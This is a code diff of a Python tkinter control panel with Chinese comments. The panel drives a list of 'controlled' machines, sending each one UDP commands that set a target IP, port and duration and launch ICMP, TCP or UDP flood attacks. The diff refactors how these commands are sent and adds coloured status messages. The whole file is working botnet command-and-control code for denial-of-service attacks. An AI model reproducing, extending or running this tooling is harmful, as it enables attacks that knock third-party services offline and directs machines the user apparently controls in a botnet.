@@ -2,9 +2,14 @@ import matplotlib,socket,threading,json,random
 import os,time,struct
 import tkinter as tk
 import tkinter.ttk as ttk
+import LIV
 from tkinter import *
 
 global control
+
+class msg:   #設定prefix訊息標籤
+    success = F"{LIV.Color.GREEN}[成功]{LIV.Color.RESET}"
+    fail = F"{LIV.Color.RED}[錯誤]{LIV.Color.RESET}"
 
 def attack_test_show():
     controlled_enter_button.place_forget()
@@ -58,33 +63,22 @@ def connect_test_show():
 
 def send_commands(code,parameter):
     controlled_ip = open('controlled_IP_list.txt','r',encoding='utf-8')
-    for IPt in controlled_ip.readlines():
-        if IPt == "\n":
-            break
-        else:
-            try:
-                control.sendto("連接成功".encode(),(IPt[:-1],10))
-                print(F"{IPt[:-1]}連接成功")
-            except Exception as ex:
-                print(F'{IPt[:-1]}連接有誤\n{ex}')
-    controlled_ip.close
-    controlled_ip = open('controlled_IP_list.txt','r',encoding='utf-8')
     if code == "code00": ##更改攻擊IP
         for IPt in controlled_ip.readlines():
             control.sendto(F"code00{parameter}".encode(),(IPt[:-1],10))
-            print(F"{IPt}傳送指令成功")
+            print(F"{msg.success}{LIV.Color.YELLOW}{IPt}{LIV.Color.RESET}已發送指令:{code}")
     elif code == "code01": ##更改攻擊時間
         for IPt in controlled_ip.readlines():
             control.sendto(F"code01{parameter}".encode(),(IPt[:-1],10))
-            print(F"{IPt}傳送指令成功")
+            print(F"{msg.success}{LIV.Color.YELLOW}{IPt}{LIV.Color.RESET}已發送指令:{code}")
     elif code == "code02": ##發動ICMP攻擊
         for IPt in controlled_ip.readlines():
             control.sendto(F"code02{parameter}".encode(),(IPt[:-1],10))
-            print(F"{IPt}傳送指令成功")
+            print(F"{msg.success}{LIV.Color.YELLOW}{IPt}{LIV.Color.RESET}已發送指令:{code}")
     elif code == "code03": ##更改攻擊PORT
         for IPt in controlled_ip.readlines():
             control.sendto(F"code03{parameter}".encode(),(IPt[:-1],10))
-            print(F"{IPt}傳送指令成功")
+            print(F"{msg.success}{LIV.Color.YELLOW}{IPt}{LIV.Color.RESET}已發送指令:{code}")
     controlled_ip.close
 
 def attack():
@@ -94,23 +88,20 @@ def attack():
     attack_mode =attack_mode_combobox.get()
 
     if attack_ip == "" or attack_port == "" or attack_time == "" or attack_mode == "":
-        print("參數未齊全")
+        print(F"{msg.fail}參數未齊全")
         return
     
+    send_commands(code="code00", parameter=str(attack_ip))
+    send_commands(code="code03", parameter=str(attack_port))
+    send_commands(code="code01", parameter=str(attack_time))
+
     if str(attack_mode) == "ICMP flood":
-        send_commands(code="code00", parameter=str(attack_ip))
-        send_commands(code="code03", parameter=str(attack_port))
-        send_commands(code="code01", parameter=str(attack_time))
         send_commands(code="code02", parameter="ICMP")
+
     elif str(attack_mode) == "TCP flood":
-        send_commands(code="code00", parameter=str(attack_ip))
-        send_commands(code="code03", parameter=str(attack_port))
-        send_commands(code="code01", parameter=str(attack_time))
         send_commands(code="code02", parameter="TCP")
+
     elif str(attack_mode) == "UDP flood":
-        send_commands(code="code00", parameter=str(attack_ip))
-        send_commands(code="code03", parameter=str(attack_port))
-        send_commands(code="code01", parameter=str(attack_time))
         send_commands(code="code02", parameter="UDP")
 
 def controlled_ip_insert():
@@ -118,14 +109,14 @@ def controlled_ip_insert():
     file = open('controlled_IP_list.txt','r')
     for findip in file:
         if controlled_ip == findip[:-1]:
-            print("已有存在的IP")
+            print(F"{msg.fail}已有存在的IP")
             return
     controlled_ip_list.insert(END, controlled_ip)
     file=open('controlled_IP_list.txt','a')
     file.writelines(F"{controlled_ip}\n")
     file.close
 
-def delete_selected_item(x):
+def delete_selected_item(xl):
     selected_item = controlled_ip_list.curselection()
     x =controlled_ip_list.get(selected_item)
     controlled_ip_list.delete(selected_item)
@@ -148,7 +139,7 @@ def connect_test():
     try:
         control = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     except Exception as ex:
-        print("連線有誤\n{ex}")
+        print(F"{msg.fail}連線有誤\n{ex}")
     controlled_ip= open('controlled_IP_list.txt','r',encoding='utf-8').readlines()
     for IPt in controlled_ip:
         if IPt == "\n":
@@ -156,9 +147,9 @@ def connect_test():
         else:
             try:
                 control.sendto("連接成功".encode(),(IPt[:-1],10))
-                print(F"{IPt[:-1]}連接成功")
+                print(F"{msg.success}{LIV.Color.YELLOW}{IPt[:-1]}{LIV.Color.RESET}發送連接請求成功")
             except Exception as ex:
-                print(F'{IPt[:-1]}連接有誤\n{ex}')     
+                print(F'{msg.fail}{LIV.Color.YELLOW}{IPt[:-1]}{LIV.Color.RESET}連接有誤\n{ex}')
 
 if __name__ == '__main__':
 
